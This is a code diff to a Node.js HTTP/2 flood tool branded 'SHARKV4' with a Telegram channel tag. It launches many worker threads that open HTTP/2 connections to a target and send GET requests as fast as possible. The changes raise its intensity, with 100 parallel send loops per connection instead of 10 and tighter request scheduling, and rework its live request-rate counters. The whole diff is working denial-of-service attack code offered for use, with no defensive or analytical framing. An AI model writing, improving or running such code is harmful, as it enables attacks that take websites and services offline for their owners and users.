@@ -1,15 +1,14 @@
-// SHARKV4 - T.ME/STSVKINGDOM
+// SHARKV4.2 - T.ME/STSVKINGDOM
 const http2 = require('http2');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const net = require('net');
 const fs = require('fs');
 const readline = require('readline');
 
-// ========== CONFIG ==========
-const PROXIES_ENABLED = 'N'; // 'Y' = Use proxies from proxies.txt, 'N' = Raw only
+const PROXIES_ENABLED = 'N';
 const POWER_MULTIPLIER = 1;
 const MAX_INFLIGHT = 2000;
-const REFRESH_RATE = 100;
+const REFRESH_RATE = 5000;
 
 const TAGS = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];
 
@@ -49,7 +48,7 @@ if (isMainThread) {
     const proxies = PROXIES_ENABLED === 'Y' ? loadProxies() : [];
 
     console.clear();
-    console.log(`SHARKV4 - T.ME/STSVKINGDOM`);
+    console.log(`SHARKV4.2 - T.ME/STSVKINGDOM`);
     for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
         new Worker(__filename, { workerData: { target, duration, proxies, useProxies: PROXIES_ENABLED === 'Y' } });
     }
@@ -65,9 +64,9 @@ if (isMainThread) {
         const timeLeft = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
         readline.cursorTo(process.stdout, 0, 0);
         readline.clearScreenDown(process.stdout);
-        console.log(`SHARKV4 - T.ME/STSVKINGDOM`);
+        console.log(`SHARKV4.2 - T.ME/STSVKINGDOM`);
         console.log(`==============================`);
-        console.log(`total: ${totalRequests}`);
+        console.log(`total: ${successCount + errorCount}`);
         console.log(`max-r: ${maxRps}`);
         console.log(`==============================`);
         console.log(`succes: ${successCount}`);
@@ -79,9 +78,8 @@ if (isMainThread) {
     const server = net.createServer(socket => {
         socket.on('data', data => {
             const msg = data.toString();
-            if (msg === 'req') totalRequests++, rpsLastSecond++;
-            else if (msg === 'ok') successCount++;
-            else if (msg === 'err') errorCount++;
+            if (msg === 'ok') successCount++, rpsLastSecond++;
+            else if (msg === 'err') errorCount++, rpsLastSecond++;
         });
     });
     server.listen(9999);
@@ -93,11 +91,9 @@ if (isMainThread) {
     const sendStat = msg => socket.write(msg);
 
     function sendLoop(client, inflight) {
-        if (Date.now() > end || client.destroyed) return;
-
-        if (inflight.count < MAX_INFLIGHT) {
+        while (inflight.count < MAX_INFLIGHT && Date.now() < end && !client.destroyed) {
+            inflight.count++;
             try {
-                inflight.count++;
                 const headers = {
                     ':method': 'GET',
                     ':path': '/',
@@ -106,26 +102,32 @@ if (isMainThread) {
                     'accept': '*/*'
                 };
                 const req = client.request(headers);
+                let counted = false;
+
                 req.on('response', () => {
+                    if (!counted) sendStat('ok');
+                    counted = true;
                     inflight.count--;
-                    sendStat('ok');
                     req.close();
                 });
+
                 req.on('error', () => {
+                    if (!counted) sendStat('err');
+                    counted = true;
                     inflight.count--;
-                    sendStat('err');
                 });
+
                 req.on('close', () => {
                     inflight.count--;
                 });
+
                 req.end();
-                sendStat('req');
             } catch {
                 inflight.count--;
                 sendStat('err');
             }
         }
-        setImmediate(() => sendLoop(client, inflight));
+        process.nextTick(() => sendLoop(client, inflight));
     }
 
     function createConnection() {
@@ -138,9 +140,11 @@ if (isMainThread) {
                 ALPNProtocols: ['h2']
             });
             const inflight = { count: 0 };
+
             client.on('connect', () => {
-                for (let i = 0; i < 10; i++) sendLoop(client, inflight);
+                for (let i = 0; i < 100; i++) sendLoop(client, inflight);
             });
+
             client.on('error', () => client.destroy());
             client.on('goaway', () => client.close());
             client.on('close', () => setTimeout(createConnection, getRandomInt(500, 1000)));
